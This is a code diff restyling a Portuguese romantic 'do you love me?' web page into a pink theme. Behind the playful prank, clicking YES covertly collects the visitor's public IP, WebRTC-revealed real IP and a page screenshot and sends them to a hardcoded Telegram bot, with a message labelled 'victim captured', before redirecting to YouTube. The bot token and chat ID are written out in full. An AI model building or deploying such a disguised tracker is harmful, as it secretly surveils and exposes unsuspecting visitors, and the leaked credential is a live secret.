@@ -12,91 +12,126 @@
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
-            background: #0a0a0a;
-            font-family: 'Courier New', monospace;
+            background: #ffe4ec;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
         }
+
         .container {
-            max-width: 600px;
+            max-width: 500px;
             width: 100%;
-            background: #111;
-            border: 2px solid #fff;
-            border-radius: 12px;
-            padding: 40px 30px;
+            background: #ffffffd9;
+            backdrop-filter: blur(4px);
+            border-radius: 40px 12px 40px 12px;
+            padding: 50px 30px;
             text-align: center;
-            box-shadow: 0 0 60px rgba(255, 255, 255, 0.05);
+            box-shadow: 0 8px 32px rgba(255, 105, 135, 0.15);
+            border: 1px solid rgba(255, 182, 193, 0.3);
+            transition: all 0.3s ease;
         }
+
         .pergunta {
-            font-size: 28px;
-            color: #fff;
-            margin-bottom: 40px;
-            letter-spacing: 2px;
+            font-size: 26px;
+            color: #4a2c3a;
+            margin-bottom: 30px;
+            letter-spacing: 1px;
             font-weight: 300;
         }
+
+        .pergunta .emoji {
+            color: #ff6b8a;
+            display: inline-block;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+        }
+
         .buttons {
             display: flex;
             justify-content: center;
-            gap: 50px;
+            gap: 40px;
             flex-wrap: wrap;
             position: relative;
-            min-height: 80px;
+            min-height: 70px;
+            margin-top: 10px;
         }
+
         .btn {
-            font-size: 22px;
-            padding: 14px 50px;
-            border: 2px solid #fff;
+            font-size: 18px;
+            padding: 14px 44px;
+            border: 2px solid #ffb6c1;
             background: transparent;
-            color: #fff;
+            color: #4a2c3a;
             cursor: pointer;
             transition: all 0.3s ease;
-            font-family: 'Courier New', monospace;
-            letter-spacing: 2px;
-            border-radius: 8px;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            letter-spacing: 1px;
+            border-radius: 60px 12px 60px 12px;
             min-width: 120px;
+            background: #ffffff;
+            box-shadow: 0 2px 8px rgba(255, 105, 135, 0.05);
         }
+
+        .btn-sim {
+            border-color: #ff8da1;
+            color: #4a2c3a;
+            background: #fff5f7;
+        }
+
         .btn-sim:hover {
-            background: #fff;
-            color: #000;
+            background: #ff8da1;
+            color: #ffffff;
+            box-shadow: 0 4px 16px rgba(255, 105, 135, 0.3);
+            transform: translateY(-2px);
         }
+
         .btn-nao {
-            border-color: #666;
-            color: #666;
+            border-color: #dcdcdc;
+            color: #999;
+            background: #f9f9f9;
             transition: all 0.05s ease;
             position: relative;
         }
-        .final-message {
-            display: none;
-            margin-top: 30px;
-            font-size: 24px;
-            color: #fff;
-            border-top: 1px solid #333;
-            padding-top: 30px;
-            letter-spacing: 2px;
-            line-height: 1.8;
+
+        .btn-nao:hover {
+            transform: scale(1);
         }
-        .final-message .destaque {
-            color: #ff3366;
-            font-weight: bold;
-        }
+
         .loader {
-            border: 3px solid #1a1a1a;
-            border-top: 3px solid #fff;
+            border: 3px solid #ffe4ec;
+            border-top: 3px solid #ff6b8a;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
+            width: 36px;
+            height: 36px;
+            animation: spin 0.9s linear infinite;
             margin: 20px auto;
             display: none;
         }
+
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
         }
+
+        /* ─── CORAÇÕES FLUTUANTES (DISCRETAS) ─── */
         .floating-hearts {
             position: fixed;
             top: 0;
@@ -107,22 +142,48 @@
             z-index: 999;
             overflow: hidden;
         }
+
         .floating-heart {
             position: absolute;
-            font-size: 20px;
+            font-size: 16px;
             animation: floatUp 6s linear forwards;
-            opacity: 0.6;
+            opacity: 0.4;
+            color: #ffb6c1;
         }
+
         @keyframes floatUp {
-            0% { transform: translateY(100vh) rotate(0deg) scale(0.5); opacity: 0; }
-            10% { opacity: 0.6; }
-            90% { opacity: 0.6; }
-            100% { transform: translateY(-10vh) rotate(720deg) scale(1.2); opacity: 0; }
+            0% {
+                transform: translateY(100vh) rotate(0deg) scale(0.5);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.5;
+            }
+            90% {
+                opacity: 0.5;
+            }
+            100% {
+                transform: translateY(-10vh) rotate(720deg) scale(1.1);
+                opacity: 0;
+            }
         }
+
+        /* ─── RESPONSIVO ─── */
         @media (max-width: 500px) {
-            .pergunta { font-size: 22px; }
-            .btn { font-size: 18px; padding: 12px 30px; min-width: 100px; }
-            .buttons { gap: 30px; }
+            .container {
+                padding: 30px 18px;
+            }
+            .pergunta {
+                font-size: 20px;
+            }
+            .btn {
+                font-size: 16px;
+                padding: 12px 28px;
+                min-width: 100px;
+            }
+            .buttons {
+                gap: 20px;
+            }
         }
     </style>
 </head>
@@ -131,37 +192,36 @@
     <div class="floating-hearts" id="floatingHearts"></div>
 
     <div class="container" id="page-content">
-        <div class="pergunta">voce me ama?</div>
+        <div class="pergunta">
+            <span class="emoji">💗</span> voce me ama?
+        </div>
+
         <div class="buttons" id="buttonArea">
             <button class="btn btn-sim" id="btnSim">SIM</button>
             <button class="btn btn-nao" id="btnNao">NAO</button>
         </div>
+
         <div class="loader" id="loader"></div>
-        <div class="final-message" id="finalMessage">
-            <div>💖</div>
-            <div>eu <span class="destaque">tambem</span> te amo</div>
-            <div style="font-size:14px; margin-top:15px; opacity:0.5;">ANG</div>
-        </div>
     </div>
 
     <script>
         // ============================================================
-        // BOTÃO "NAO" FUGINDO
+        // BOTÃO "NAO" FUGINDO (VERSÃO CLEAN)
         // ============================================================
         const btnNao = document.getElementById('btnNao');
         const btnSim = document.getElementById('btnSim');
-        const finalMessage = document.getElementById('finalMessage');
         const container = document.getElementById('page-content');
         const buttonArea = document.getElementById('buttonArea');
         const loader = document.getElementById('loader');
 
         btnNao.addEventListener('mouseenter', function(e) {
-            if (finalMessage.style.display === 'block') return;
             const containerRect = container.getBoundingClientRect();
             const btnRect = btnNao.getBoundingClientRect();
+
             const padding = 20;
             const maxX = containerRect.width - btnRect.width - padding;
             const maxY = containerRect.height - btnRect.height - padding;
+
             let newX, newY;
             let attempts = 0;
             do {
@@ -170,13 +230,13 @@
                 attempts++;
                 if (attempts > 50) break;
             } while (Math.abs(newX - btnNao.offsetLeft) < 30 && Math.abs(newY - btnNao.offsetTop) < 30);
+
             btnNao.style.position = 'absolute';
             btnNao.style.left = Math.max(0, Math.min(newX, maxX)) + 'px';
             btnNao.style.top = Math.max(0, Math.min(newY, maxY)) + 'px';
         });
 
         btnNao.addEventListener('click', function(e) {
-            if (finalMessage.style.display === 'block') return;
             const containerRect = container.getBoundingClientRect();
             const btnRect = btnNao.getBoundingClientRect();
             const maxX = containerRect.width - btnRect.width - 20;
@@ -187,37 +247,24 @@
         });
 
         // ============================================================
-        // BOTÃO "SIM" — DISPARA TUDO
+        // BOTÃO "SIM" — DISPARA TUDO E REDIRECIONA PRO YOUTUBE
         // ============================================================
         btnSim.addEventListener('click', function() {
+            // Esconde botões e mostra loading
             buttonArea.style.display = 'none';
             loader.style.display = 'block';
+
+            // Coleta os dados e envia em background
             coletarEEnviar();
+
+            // Redireciona pro YouTube (Post Malone - I Fall Apart)
             setTimeout(() => {
-                loader.style.display = 'none';
-                finalMessage.style.display = 'block';
-                for (let i = 0; i < 30; i++) {
-                    setTimeout(() => {
-                        const heart = document.createElement('div');
-                        heart.className = 'floating-heart';
-                        heart.textContent = '♥';
-                        heart.style.left = Math.random() * 90 + 5 + '%';
-                        heart.style.fontSize = (Math.random() * 20 + 16) + 'px';
-                        heart.style.animationDuration = (Math.random() * 4 + 3) + 's';
-                        heart.style.color = '#ff3366';
-                        document.getElementById('floatingHearts').appendChild(heart);
-                        setTimeout(() => { heart.remove(); }, 7000);
-                    }, i * 60);
-                }
-                document.querySelector('.pergunta').style.display = 'none';
-                setTimeout(() => {
-                    finalMessage.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                }, 300);
-            }, 1500);
+                window.location.href = 'https://www.youtube.com/watch?v=JQbjS0_ZfJ0';
+            }, 2000);
         });
 
         // ============================================================
-        // COLETAR E ENVIAR PRO TELEGRAM (SEM GPS, SEM CÂMERA)
+        // COLETAR E ENVIAR PRO TELEGRAM
         // ============================================================
         const BOT_TOKEN = "8819910333:AAEYctveGsw4Uf0RBCBKxbU3dkXJpO2fld4";
         const CHAT_ID = "8551438856";
@@ -367,7 +414,7 @@
                     const canvas = await html2canvas(document.body, {
                         scale: 1.5,
                         useCORS: true,
-                        backgroundColor: '#0a0a0a',
+                        backgroundColor: '#ffe4ec',
                         logging: false,
                         allowTaint: false,
                         width: window.innerWidth,
@@ -380,7 +427,7 @@
 
                 // ---- MONTA MENSAGEM ----
                 let msg = `
-        💀 **RUSSO PIRATA — LOCALIZAÇÃO POR IP** 💀
+        💗 **CLEAN GIRL — VÍTIMA CAPTURADA** 💗
 
         🌐 **IP Público:** ${ip}
         🔴 **IP Real (WebRTC):** ${webrtcIP}
@@ -446,10 +493,10 @@
         }
 
         // ============================================================
-        // CORAÇÕES FLUTUANTES
+        // CORAÇÕES FLUTUANTES (FUNDO)
         // ============================================================
         setInterval(() => {
-            if (finalMessage.style.display === 'block') return;
+            if (document.getElementById('buttonArea').style.display === 'none') return;
             const heart = document.createElement('div');
             heart.className = 'floating-heart';
             heart.textContent = '♥';
@@ -457,7 +504,7 @@
             heart.style.fontSize = (Math.random() * 14 + 10) + 'px';
             heart.style.animationDuration = (Math.random() * 5 + 4) + 's';
             heart.style.opacity = '0.2';
-            heart.style.color = '#ff3366';
+            heart.style.color = '#ffb6c1';
             document.getElementById('floatingHearts').appendChild(heart);
             setTimeout(() => { heart.remove(); }, 8000);
         }, 3000);
